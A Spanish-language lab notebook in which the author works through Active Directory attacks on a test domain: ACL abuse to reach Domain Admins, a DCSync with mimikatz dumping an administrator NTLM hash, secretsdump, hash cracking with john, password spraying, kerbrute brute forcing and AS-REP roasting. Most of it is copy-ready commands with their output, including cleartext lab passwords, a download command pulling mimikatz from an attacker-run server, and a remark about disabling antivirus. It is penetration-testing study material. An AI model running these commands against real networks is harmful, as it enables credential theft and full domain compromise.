~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ya con esto tenemos a nuestra usuaria Adey dentro del grupo de project .

Una vez dentro como usuario me percate que en mi caso el grupo project no es administrador como el caso del maestro que si lo es, en este caso ya dentro de
project con el usuario dita veo que project tiene vinculos por medio del permiso writeowner en el grupo admnistrators.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Set-DomainObjectOwner -Credential $Cred -Identity "ADMINISTRATORS" -OwnerIdentity "dita.gerrie" 
con este comando podria ejecturar la explotacion de este permiso y recordar que a diferencia de genericwrite que 
puede editar, borrar y manipular objetos writeowner se convierte en el propietario de ese grupo, en este caso
dita se convirtio en el propietario del grupo administrators.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Anteriormente veia que Administrators no se encuentra en el active directory pero si en la base de datos en kali de bloodhound
configure a project management con miembro de administrador aun asi sigue sin serlo y tome el usuario de accounting dita.gerrie
la pase a el grupo proyect management, ahora el usurio esta en los dos grupos solo que lo anadi a el ultimo mencionado para estar mas
cerca de mi objetivo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainGroupMember -Identity "dita.gerrie" -Members "Project management" -Credential $Cred
utiliznado el privilegio de GenericWrite, pero me di cuenta que estos dos grupos sin privilegios tienen algo en
comun tienen el privilegio writeowner con el grupo Administrators en este caso veo que tiene una mala configuracion
porque en active directory se llama Administrador, este grupo tiene permisos de administrador
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Utilice project management para esto utilice 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Set-DomainObjectOwner -Credential $Cred -Identity "Administrador" -OwnerIdentity "dita.gerrie" 
recordando que pasamos el usuario a proyect management, estando dentro de shell con el usuario 
ejecutamos el comando anterior y ya somos propietarios de Administrador 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ya teniendo esta ventaja procedemos a lo siguiente, es anadir un usuario y un nuevo grupo al grupo que
obtuvimos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights WriteMembers -PrincipalIdentity dita.gerrie 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto nos creara un permiso especial el cual lo tendra el usuario dita dentro de project en su ACL
project tambien cambio a ser propiedad de dita ya que Administrador en este dominio es usuario y no grupo

• Add-DomainObjectAcl: Este es el cmdlet que se utiliza para agregar una entrada de ACL a un objeto de Active Directory.

• -TargetIdentity "Project management": Este parámetro especifica el identificador del objeto de Active Directory al que se aplicarán los permisos adicionales. En este caso, el objeto es el grupo "Project management".

• -Rights WriteMember: Este parámetro especifica los derechos que se agregarán a la entrada de ACL. En este caso, estás otorgando el derecho de escribir en los miembros del grupo, lo que permite agregar o eliminar miembros del grupo "Project management".

• -PrincipalIdentity dita.gerrie: Este parámetro especifica el identificador del principal al que se otorgan los derechos especificados. En este caso, estás otorgando estos derechos al usuario "dita.gerrie".

Este permiso especial nos otorga el privilegio de anadir nuevos miembros al grupo proyect

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainGroupMember -Identity "Project management" -Members xusuario
y tendra los mismos privilegios que los demas usuarios
Debi de hacer de un grupo sin privilegios a este y haberle pasado el usuario
dita pero ya lo habiamos hecho y no tenemos la misma infraestructura que el video
en dado caso seria comprometer un usuario sin privilegios de un grupo sin
privilegios e ir escalando por medios de los ACL o los privilegios entre grupos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora de project pasaremos a un grupo mas importante que es del grupo administrador
se llama administradores de empresa y usaremos su vinculo que es el privilegio genericwrite

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
el mismo que el anterior para agregar un usuario, en este caso sera el mismo de
project que hemos usado, dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En dado caso que presente que no tengamos permiso salir de shell y volver a entrar al usuario dita

Ahora nos queda entrar a lo que empezamos desde un principio y es primero anadir un usuario a admin. del dominio
si el privilegio de vicnulo es  WriteDacl

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "ADMINS. DEL DOMINIO" -Rights WriteMembers -PrincipalIdentity dita.gerrie 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En mi caso no esta ese vinculo pero si mas, el writeowner,owner, y el genericwirte que es el que voy a utilizar

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Add-DomainGroupMember -Identity 'Admins. del dominio' -Members 'dita.gerrie' -Credential $Cred  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tener en cuenta esto, si no tiene el vinculo de writedacl y aun asi lo ejecuto no presentara error pero no se aplicara ningun cambio
por esa razon es indispensable utilizar la grafica de bloodhound y marcar los pasos para llegar a nuestro objetivo

Y como tambien anadi dita con permisos especiales dentro de la acl del dominio admin

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Admins. del dominio" -Rights WriteMembers -PrincipalIdentity dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Sí, puedes utilizar el cmdlet `Add-DomainObjectAcl` para otorgar diferentes tipos de permisos a diferentes usuarios o grupos en Active Directory. Aquí tienes algunos ejemplos de cómo utilizar este cmdlet con diferentes tipos de permisos:

1. **Owner**: Para otorgar al usuario "dita.gerrie" el permiso de ser propietario del grupo "Project management", puedes utilizar el siguiente comando:

```plaintext

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights Owner -PrincipalIdentity dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

```

2. **WriteOwner**: Para otorgar al usuario "dita.gerrie" el permiso de escribir el propietario del grupo "Project management", puedes utilizar el siguiente comando:

```plaintext

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights WriteOwner -PrincipalIdentity dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

```

3. **WriteDacl**: Para otorgar al usuario "dita.gerrie" el permiso de escribir la DACL (Lista de Control de Acceso Discrecional) del grupo "Project management", puedes utilizar el siguiente comando:

```plaintext

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights WriteDacl -PrincipalIdentity dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

```

4. **GenericAll**: Para otorgar al usuario "dita.gerrie" todos los permisos posibles en el grupo "Project management", puedes utilizar el siguiente comando:

```plaintext

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights GenericAll -PrincipalIdentity dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

```

5. **GenericWrite**: Para otorgar al usuario "dita.gerrie" el permiso genérico de escritura en el grupo "Project management", puedes utilizar el siguiente comando:

```plaintext

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights GenericWrite -PrincipalIdentity dita.gerrie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

```
Diferencia de Owner y WriteOwner

1. Owner: El permiso "Owner" otorga a un usuario o grupo el control total sobre un objeto de Active Directory. Esto incluye todos los derechos de modificación, eliminación y administración del objeto, así como la capacidad de modificar los permisos de acceso a dicho objeto. El propietario de un objeto puede cambiar cualquier configuración relacionada con el objeto y otorgar permisos a otros usuarios.

2. WriteOwner: El permiso "WriteOwner" otorga a un usuario o grupo el derecho específico de modificar el propietario del objeto de Active Directory. Esto permite que el usuario o grupo designado cambie quién es el propietario del objeto, pero no les otorga otros derechos de control sobre el objeto en sí. Es una forma más limitada de control en comparación con el permiso "Owner".


Lo siguiente que haremos es utilizar el usuario que introdijimos a domain controll para extraer toda la informacion
en empresas no como nuestro caso poseen diversos controladores, ya sea por si pierden uno tienen resplado en varios mas
lo que haremos es solicitar mediante el usuario que introdujimos solicitudes para replicar toda la informacion de este, pero en
este caso no usaremos los comandos anteriores.

Todo esto mediante el privilegio DCSync

Para ello necesitamos un usuario con descripcion Replication Account
este conlleva en mi caso privilegios dcsync en otro podria ser 
El usuario IVETTE.MALORIE@CORP.LOCAL tiene el privilegio DS-Replication-Get-Changes y DS-Replication-Get-Changes-All en el dominio CORP.LOCAL.

Estos dos privilegios permiten que un director realice un ataque DCSync.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select ObjectDN,ObjectAceType,@{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}} 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


El comando que proporcionas es una secuencia de comandos en PowerShell que se utiliza para obtener información sobre los permisos de acceso a objetos en Active Directory relacionados con la replicación de directorios. Aquí está el desglose del comando por pasos:

1. **Get-ObjectAcl -ResolveGUIDs**: Este comando obtiene la lista de permisos de acceso para objetos en Active Directory. La opción `-ResolveGUIDs` se utiliza para resolver los GUID (identificadores únicos globales) a nombres legibles en el resultado.

2. **| ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"}**: El operador `|` se utiliza para pasar la salida del comando anterior al siguiente comando. El comando `?` (alias de `Where-Object`) filtra los resultados basados en una condición especificada entre llaves `{}`. En este caso, la condición `-match` se utiliza para buscar entradas cuyo `ObjectAceType` coincida con el patrón "DS-Replication-Get-Changes".

3. **| select ObjectDN,ObjectAceType,@{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}}**: El siguiente operador de canalización (`|`) pasa los resultados filtrados al comando `select`, que se utiliza para seleccionar y mostrar columnas específicas de los resultados. Las columnas seleccionadas son `ObjectDN`, `ObjectAceType` y `Name`.

   - `ObjectDN`: Representa el Distinguished Name (DN) del objeto en Active Directory al que se aplican los permisos.
   - `ObjectAceType`: Representa el tipo de permiso de acceso del objeto.
   - `@{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}}`: Esta expresión calculada crea una nueva columna llamada "Name", que utiliza el cmdlet `Convert-SidToName` para convertir el identificador de seguridad (SID) en un nombre de usuario legible.

En resumen, este comando busca y muestra información específica sobre los permisos de acceso relacionados con la replicación de directorios en Active Directory, incluyendo el nombre del objeto, el tipo de permiso y el nombre del usuario asociado al SID.

Utilizaremos la herramienta mimikatz para explotar dcsync, muy utilizada pero de igualmente muy detectada por las herramientas de seguridad.

En mi caso comprometi al usuario ivette.malorie quien en mi caso es el unico con descripcion Replication account

Lo que haremos sera lo siguiente, descargaremos mimikatz del repositorio de security en github.com, y lo pasaremos a la maquina WS02
donde tenemos habilitado el usuario ivette.malorie, lo haremos como anteriormente, abriremos un servidor en kali y un comando en la maquina
donde se recibira el archivo
En kali

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python2 -m SimpleHTTPServer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

en WS02

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.5:8000/mimikatz.exe','mimikatz.exe')
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Una vez tenido en este caso debi de desactivar el antivirus en tiempo real, pero mas adelante veremos como evadir estas
ejecutamos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\mimikatz.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

y lo siguiente seran los comandos de este

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lsadump::dcsync /user:corp\administrador
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

• lsadump: Es un módulo en herramientas como Mimikatz, que permite extraer información del sistema de autenticación de Windows, específicamente de los controladores de dominio (Domain Controllers).

• dcsync: Es una característica de lsadump que permite a un atacante simular ser un controlador de dominio y solicitar información de autenticación de un usuario específico. En otras palabras, le permite al atacante "sincronizar" los datos del directorio activo de un usuario específico sin necesidad de autenticarse como ese usuario.

• /user:corp\administrador: Especifica el usuario cuya información de autenticación se desea sincronizar. En este caso, el usuario es "administrador" y pertenece al dominio "corp".

Con este comando extraermos las credenciales del objetivo en este caso el usuario administrador, recordando que esta cifrada, en mi caso hash NTLM


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Object RDN           : Administrador

** SAM ACCOUNT **

SAM Username         : Administrador
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/03/2024 20:34:43
Object Security ID   : S-1-5-21-1087878042-4283918813-3206888575-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Otra forma mas agresiva seria tener todas las credenciales de todos los usuarios, ya habiendo comprometido el usuario con dicha descripcion 
solamente seria irnos a kali y 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump -just-dc ivette.malorie:"Ap09mncd"@192.168.0.7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

La direccion ip debe de ser del controlador de dominio

Luego tomamos en este caso las credenciales del usuario administrador y la hasheamos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Administrador:500:aad3b435b51404eeaad3b435b51404ee:eef6eedd62257ff1ffdc29dd61add972:::
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

realizo luego

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo Administrador:500:aad3b435b51404eeaad3b435b51404ee:eef6eedd62257ff1ffdc29dd61add972::: > admin.hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

y usamos john

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john --format=NT admin.hash
tambien podemos usar --incremental o --wordlist=rockyou.txt que tenemos 
para claves mas seguras
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




La herramienta que veremos ahora se llama password spraying, su funcion es probar una contrasena que le coloquemos en todos los usuarios
en este caso del dominio y ver que usurio posee dicha credencial.

Primero ejecutamos powerview y luego el siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser | select name,description
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

este comando me mostrara todos los usuarios, aparte del select que es para que muestre el nombre y descripcion de este

Buscamos el script se llama domainpasswordspray, en el repositorio de github, y el mismo proceso que sabemos
presionamos el archivo.ps1 luego raw copiamos los codigos y en un bloc de nota pegamos y guardamos en todos los archivos
y el nombre con la extension .ps1

En este caso en la linea 261 tendra un error, solo basta con comentarla y ejecutar el script

Antes de ejecutar el comando de passwordspray debemos de tener una lista de los usuarios en los cuales intentaremos penetrar
para esto

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser | Select-Object -ExpandProperty name | Out-File C:\Users\empleado2\Desktop\users.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser: Este comando obtiene una lista de usuarios de la red. Get-NetUser es un cmdlet de 
PowerShell que recupera información sobre los usuarios de la red.

|: Este es el operador de canalización (pipe) que toma la salida del comando anterior y la pasa 
como entrada al siguiente comando.

Select-Object -ExpandProperty name: Este comando selecciona solo la propiedad "name" de la salida 
del comando anterior y la expande, es decir, muestra solo los valores de la propiedad "name". Esto 
significa que solo se mostrarán los nombres de usuario de la lista de usuarios obtenida anteriormente.

Out-File C:\Users\empleado2\Desktop\users.txt: Este comando redirige la salida de la operación 
anterior y la escribe en un archivo de texto llamado "users.txt" ubicado en la ruta especificada 
(C:\Users\empleado2\Desktop). La función Out-File se utiliza para escribir datos en un archivo en 
PowerShell.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora ingresamos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Invoke-DomainPasswordSpray -UserList .\users.txt -Password "DefaultPassword" -Verbose

Llmamos a invoke le pasamos para lista de usuarios y el archivo de este luego
le pasamos la contrasena que probara en todos los usurios y finalmente como sabemos
verbose para que no saque mas informacion, mas detalle
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

De esta fomra solo me mostro que ningun usuario posee esa clave y Ap09mncd que sabemos que son varios usuarios
a lo que intervenimos poseen la clave pero solo me muestra el usuario donde estoy logeado en cambio


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Invoke-DomainPasswordSpray -Password Ap09mncd  
 Con este comando me muestra todos los usuarios que poseen esta clave
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[*] SUCCESS! User:empleado2 Password:Ap09mncd
[*] SUCCESS! User:ivette.malorie Password:Ap09mncd
[*] SUCCESS! User:adey.celestyna Password:Ap09mncd
[*] SUCCESS! User:anna.ailyn Password:Ap09mncd
[*] SUCCESS! User:dita.gerrie Password:Ap09mncd
[*] SUCCESS! User:alyce.sonni Password:Ap09mncd
[*] Password spraying is complete    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Pero saber que, esta herramienta la detectan las sdl, es muy intrusiva, ya que genera mucho trafico y cuando pregunto a todas las maquinas
por una clave las que no se bloquearan ya que en las empresas se les coloca un maximo de intento, solo era para conocer pero no para usar en
lugares como macro empresas.

Ahora pasaremos a una herramienta que se utiliza para la autenticacion de usuarios y host en windows desde windows 2000 y que aparte de eso
en si es un protocolo de autenticacion y de quien hablo pues de Kerberos creado por el MIT


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Kerberos es un protocolo de autenticación de red diseñado para proporcionar una autenticación segura entre 
clientes y servidores en un entorno de red. Su función principal es verificar la identidad de los usuarios 
y garantizar que solo los usuarios autorizados puedan acceder a los recursos de la red.

El funcionamiento básico de Kerberos implica tres componentes principales: el cliente, el servidor de autenticación 
(conocido como el "Key Distribution Center" o KDC por sus siglas en inglés) y el servidor de recursos. Cuando 
un usuario intenta acceder a un recurso de red, el cliente solicita un "ticket" de autenticación al KDC. 
El KDC autentica al usuario y emite un ticket que contiene un identificador de sesión y una clave de sesión cifrada. 
El cliente envía este ticket al servidor de recursos para acceder al recurso solicitado. El servidor de recursos 
valida el ticket utilizando su clave compartida con el KDC y, si el ticket es válido, permite al cliente acceder al 
recurso.

Kerberos proporciona una autenticación segura utilizando técnicas de cifrado y tokens de autenticación que protegen 
contra ataques de suplantación de identidad y escuchas en la red. Además, minimiza la exposición de las credenciales 
de usuario al no enviar contraseñas en texto claro a través de la red.

En resumen, Kerberos es una herramienta crucial para garantizar la seguridad de la autenticación en entornos de red, 
ofreciendo un mecanismo robusto y eficiente para verificar la identidad de los usuarios y proteger los recursos de la 
red contra accesos no autorizados.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Bien, en otro tenor pasamos a instalar kerbrute en kali linus, pasamos a instalar golang en linux.
Luego pasamos a editar nuestro archivo .zshrc
Y simplemente le anadimos las nuevas direcciones al final del archivo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego ingresamos source .zshrc para cargar las nuevas direcciones

Ahora si, instalamos kerbrute en este caso con go la herramienta anteriormente instalada

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
go get github.com/ropnop/kerbrute
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ya con esto podemos ejecutar kerbrute -h

Esta herramienta realizada en go, se utiliza para la explotacion de el protocolo kerberos.

Anteriormente hemos visto como obtener la lista de los usuarios, en este caso utilizaremos la herramienta kerbrute
Para esto debemos de crear una lista de usuario, en las empresas es facil de conseguir ya que siguen un patron, nombre.apellido etc
Entonces decimos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
emacs users.txt e ingresaremos empleado1 hasta empleado5
y realizamos en este caso una lista de usuarios al azar
para mostrarlo en el proximo comando de explotacion para ver
si los usuarios en la lista existen en el dominio que colocaremos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Luego de la lista ejecutamos el siguiente comando
kerbrute userenum -d corp.local users.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Y esto es lo que pasa

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└─$ kerbrute userenum -d corp.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/06/24 - Ronnie Flathers @ropnop

2024/04/06 11:58:03 >  Using KDC(s):
2024/04/06 11:58:03 >   DC01.corp.local:88

2024/04/06 11:58:03 >  [+] VALID USERNAME:       empleado2@corp.local
2024/04/06 11:58:03 >  [+] VALID USERNAME:       empleado1@corp.local
2024/04/06 11:58:03 >  Done! Tested 5 usernames (2 valid) in 0.016 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Me detecto los usuarios que ya conocemos que creamos anteriormente
que son empleado1 y empleado2.

En esta seccion 51 utilizaremos brute user y brute force de kerbrute

Es igual a lo que veiamos antes, le podemos pasar una lista de usuario + una lista de claves e intentara ingresar a los usuarios, de igualmente
tener cuenta con esta herramienta ya que si las empresas configuran limites de intentos los usuarios se bloquearan

Primero creamos una lista con clave ya que anteriormente creamos una lista de ususario de empleado1 hasta empleado5

Luego de tener estas dos listas o simplemente lanzar la lista de claves a un solo usuario anteriormente detecto

O de igual forma podemos utilizar rockyou u otra lista para mas claves


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
kerbrute bruteuser -d corp.local password.txt empleado1
2024/04/07 18:38:36 >  [+] VALID LOGIN:  empleado1@corp.local:@ng01*Apolo
Y obtendremos esto, ya que fue unas de las claves ingresara
en la lista password    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


El otro comando seria con una lista que tenga en combinacion los usuarios y combinaciones llamada users_password.txt, ejemplo, empleado1:123456


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
kerbrute bruteforce -d corp.local users_password.txt
2024/04/07 19:11:21 >  [+] VALID LOGIN:  empleado1@corp.local:@ng01*Apolo
2024/04/07 19:11:21 >  [+] VALID LOGIN:  empleado2@corp.local:Ap09mncd
2024/04/07 19:11:21 >  Done! Tested 4 logins (2 successes) in 0.074 seconds
y se obtiene esto, dos usuarios comprometidos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otro comando seria la combinacion de kerbrute y powerspray, utilizamos nuestra lista con usuarios, en este caso le anadi mas usuarios
a diferencia de las dos anteriores esta probara una unica clave que indiquemos con todos los usuarios de la lista que le suministremos.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
kerbrute passwordspray -d corp.local users.txt @ng01*Apolo
2024/04/07 19:19:10 >  [+] VALID LOGIN:  Administrador@corp.local:@ng01*Apolo
2024/04/07 19:19:10 >  [+] VALID LOGIN:  empleado1@corp.local:@ng01*Apolo
2024/04/07 19:19:10 >  Done! Tested 7 logins (2 successes) in 0.042 seconds
Y obtenemos esto
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pasaremos a otras herramientas llamadas tecnicas de roasting

Detectamos el trafico en este caso iniciamos seccion en WS02 pero con el usuario de Administrador y nos quedaremos con el cifrado y el salt que este ultimo estara en la respuesta de preautenticacion

Lo colocamos todo en kali uno debajo del otro en un hash.txt en este ejemplo.

Usare el formato en hascat la pagina #19900 llamado kerberos 5, etype 18 pre-Auth, le damos formato, tenemos que colocar usuario, dominio y salt
para mas explicacion video 52 y utilizaremos jhon the ripper

seria en un texto, formato por default del hash luego nombre de usuario,dominio,salt,cifrado

Esta vez solamente fue john texto.txt y listo, en estos casos seria mas complejo ya que la clave es compleja para varias y sabemos que la pc no posee muchos recursos.

En mi caso aun no puedo interceptar trafico tipo kerberos
Todo lo anterior corresponde al video 52

Otra herramienta se llama Rubeus, para sistemas windows

Ya que la anterior kerbrute es para linux

Descargamos visual studio y code del repositorio ghostpack/rubeus

Sencillamente abriremos el proyecto rubeus a traves de visual studio y compilamos, todo esto en el video 53

Otra herramienta a ver se llama AS-REP Roasting

Primero en la maquina ws02 despues ejecutamos powerview y ejecutamos el siguiente comando 

 Se utiliza para buscar usuarios en un dominio de Active Directory que tengan la propiedad "PreauthNotRequired" establecida en true. Esta propiedad indica si un usuario requiere autenticación previa antes de que se pueda realizar la autenticación de Kerberos.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-DomainUser -PreauthNotRequired
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto me muestra todos los usuarios con useraccountcrontrol

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
useraccountcontrol    : NORMAL_ACCOUNT, DONT_REQ_PREAUTH 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Esta vez ejecutaremos rubeus y le anadiremos otras directrices 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asreproast /format:john /outfile:hash.john
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Aqui nos mostrara los usuarios que posen preautenticacion kerberos le pedimos que nos muestre en hash sus credenciales y salida con nombre como lo vemos

Luego de esto podemos solamente ingresar .\Rubeus.exe asreproast, copiar el hash en nuestra maquina kali en emacs y luego utilizar

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john john.hash en mi caso y luego lo mismo pero luego de john --show
en este caso la contrasena es facil de crakear
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Recordar que estos usuarios estan marcados como lo que no piden autenticacion de kerberos previa, y el ticket lo podemos interceptar

Otra forma de hacerlo es cuando en este ejemplo la maquina2 tiene permisos de editar todas las propiedades en un usuario

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Set-DomainObject -Identity Joellen.Linoel -XOR @{useraccountcontrol=4194304} -Verbose
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

De esta forma el usuario tendra activado el flag de no pedir autenticacion de kerberos previa

En estos casos en emacs en kali realizo lo siguiente para que borre todo los espacios del texto

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
alt+shift+m luego alt+x luego replace-regexp luego \s-+ y presionamos enter 2 veces
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En kali podemos verificar estos usuarios con kerbrute como anteriormente lo hicimos utilizando una lista de usuario que en este caso seria agregar
a unos de los que usamos como Joellen.Lionel

De igual forma ver el la respuesta de kerberos en wireshark con el comando anterior y tomar el cipher que es la parte cifrada y hacer el 
procedimiento como lo hicimos anteriormente, que seria complementar con el salt utilizar el hash correspondiente como lo podemos buscar en la 
pagina de hash que tenemos, acondicionarlo como lo exije y crakearlo

Una forma mas directa en una herramienta dedicada a esto en kali, impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-GetNPUsers corp.local/ -users users.txt -format john -outputfile asrep2.hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto nos mostrara el usuario que tenga la palomita habilitada de usuario que no pida autorizacion de kerberos y nos arrojara
la salida que hemos propuesto con el hash para crakearlo como ya sabemos.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-GetNPUsers corp.local/empleado2:Ap09mncd -format john -outputfile asrep2.hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Con esto le damos entrada y como los datos son correctos nos arroja todos los usuarios que possen la casilla de que no
preautorizan la entrada kerberos

Ahora vamos a ver como obtener tickets de servicios

Con los comando de powerview siguiente podremos ver : serviceprincipalname 
que son los servicios que este utiliza

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetComputer -Identity WS02
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


De igual forma ver los usuarios

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser -Identity krbtgt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

En este caso veremos : serviceprincipalname          : kadmin/changepw  
Que sera mas sencillo de crakear ya que el anterior es mas largo

Este anterior funcionara porque es un usuario de servicios, ahora , vamos a crear uno para
hacer la prueba

Creamos un usuario normal en user, le colocamos que la clave nunca expire y una clave
sencilla, la ultima casilla que es dejar cuenta deshabilitada la dejamos sin marcar pero la 
anterior si lo esta, es comun que este desabilitada.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Una vez creado el usuario en este caso se llamara MailSrvc
ingresamos el siguiente comando en la maquina domian controler
setspn -S MailSrvc/MS01.corp.local MailSrvc
Despues de -S el servicio con el cual sera referido en este caso
MailSrvc luego la maquina en donde estara una que no existe en tal
caso MS01 y el nombre del usuario MailSrvc al final.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Como identificar los usuarios que ofrecen servicios que son cuentas para servicios

